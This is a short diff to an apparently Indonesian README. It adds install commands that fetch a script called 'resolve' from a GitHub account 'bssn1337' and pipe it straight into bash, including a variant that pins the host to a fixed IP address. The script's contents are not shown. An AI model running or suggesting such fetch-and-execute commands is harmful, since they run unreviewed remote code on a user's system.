@@ -24,3 +24,10 @@ Jalankan:
 curl -fsSL https://raw.githubusercontent.com/bssn1337/proxy/main/resolve | bash
 
 curl -fsSL https://raw.githubusercontent.com/bssn1337/proxy/main/resolve -o /tmp/resolve
+
+wget -qO- https://raw.githubusercontent.com/bssn1337/proxy/main/resolve | bash
+
+
+curl -4 --resolve raw.githubusercontent.com:443:185.199.108.133 \
+  -fsSL \
+  https://raw.githubusercontent.com/bssn1337/proxy/main/resolve | bash
